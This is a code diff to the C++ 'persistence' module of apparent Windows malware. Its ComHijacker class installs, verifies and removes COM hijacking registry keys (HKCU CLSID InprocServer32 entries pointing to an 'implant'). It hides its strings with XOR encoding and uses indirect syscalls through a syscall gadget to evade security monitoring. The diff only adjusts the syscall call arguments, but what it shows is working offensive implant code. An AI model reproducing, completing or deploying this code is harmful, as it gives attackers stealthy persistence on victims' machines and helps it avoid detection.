@@ -12,7 +12,7 @@ namespace persistence {
 
 namespace {
     // XOR strings (multi-byte key)
-    const wchar_t kClsidPathEnc[] = { 'S'^0x4B, 'o'^0x1F, 'f'^0x8C, 't'^0x3E, 'w'^0x4B, 'a'^0x1F, 'r'^0x8C, 'e'^0x3E, '\\'^0x4B, 'C'^0x1F, 'l'^0x8C, 'a'^0x3E, 's'^0x4B, 's'^0x1F, 'e'^0x8C, 's'^0x3E, '\\'^0x4B, 'C'^0x1F, 'L'^0x8C, 'S'^0x3E, 'I'^0x4B, 'D'^0x1F, '\\'^0x8C }; // Software\Classes\CLSID\
+    const wchar_t kClsidPathEnc[] = { 'S'^0x4B, 'o'^0x1F, 'f'^0x8C, 't'^0x3E, 'w'^0x4B, 'a'^0x1F, 'r'^0x8C, 'e'^0x3E, '\\'^0x4B, 'C'^0x1F, 'l'^0x8C, 'a'^0x3E, 's'^0x4B, 's'^0x1F, 'e'^0x8C, 's'^0x3E, '\\'^0x4B, 'C'^0x1F, 'L'^0x8C, 'S'^0x3E, 'I'^0x4B, 'D'^0x1F, '\\'^0x8C }; // Software\Classes\CLSID
     const wchar_t kInprocEnc[] = { 'I'^0x4B, 'n'^0x1F, 'p'^0x8C, 'r'^0x3E, 'o'^0x4B, 'c'^0x1F, 'S'^0x8C, 'e'^0x3E, 'r'^0x4B, 'v'^0x1F, 'e'^0x8C, 'r'^0x3E, '3'^0x4B, '2'^0x1F }; // InprocServer32
     const wchar_t kThreadingModelEnc[] = { 'T'^0x4B, 'h'^0x1F, 'r'^0x8C, 'e'^0x3E, 'a'^0x4B, 'd'^0x1F, 'i'^0x8C, 'n'^0x3E, 'g'^0x4B, 'M'^0x1F, 'o'^0x8C, 'd'^0x3E, 'e'^0x4B, 'l'^0x1F }; // ThreadingModel
     const wchar_t kBothEnc[] = { 'B'^0x4B, 'o'^0x1F, 't'^0x8C, 'h'^0x3E }; // Both
@@ -53,7 +53,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     HANDLE hKey = NULL;
     status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
 
-    InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+    InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 
     if (NT_SUCCESS(status)) {
         UNICODE_STRING uEmpty = {0, 0, NULL};
@@ -68,7 +68,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         std::wstring tmVal = utils::DecryptW(kBothEnc, 4);
         InternalDoSyscall(ntSetValueKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, (UINT_PTR)&uTm, 0, (UINT_PTR)REG_SZ, (UINT_PTR)tmVal.c_str(), (UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
 
-        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         return true;
     }
 
@@ -96,7 +96,7 @@ bool ComHijacker::Verify(const std::wstring& clsid) {
     HANDLE hKey = NULL;
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hKey, (UINT_PTR)KEY_READ, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
     if (NT_SUCCESS(status)) {
-        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         return true;
     }
     return false;
@@ -128,11 +128,11 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
         InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
         HANDLE hSubKey = NULL;
         if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)&hSubKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&subAttr, 0, 0, 0, 0, 0, 0, 0, 0))) {
-            InternalDoSyscall(ntDeleteKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-            InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+            InternalDoSyscall(ntDeleteKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+            InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         }
-        status = InternalDoSyscall(ntDeleteKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        status = InternalDoSyscall(ntDeleteKeySsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, resolver.GetSyscallGadget(), (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
     }
     return NT_SUCCESS(status);
 }
